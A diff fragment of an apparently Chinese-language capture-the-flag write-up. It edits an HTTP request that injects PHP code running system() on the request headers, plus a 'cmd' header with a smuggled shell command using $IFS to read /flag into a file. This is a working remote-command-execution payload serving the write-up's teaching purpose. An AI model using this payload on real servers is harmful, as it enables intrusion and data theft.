@@ -535,7 +535,7 @@ apache_request_headers这个函数有可能有点冷门，其实它是<font styl
 ```python
 GET /index.php?test=system(join(apache_request_headers())); HTTP/1.1
 Host: x.x.x.x
-cmd: echo$IFS`cat /flag`>1.txt;
+cmd: ;echo$IFS`cat /flag`>1.txt;
 ```
 
 <h2 id="BB4lh">ezupload</h2>
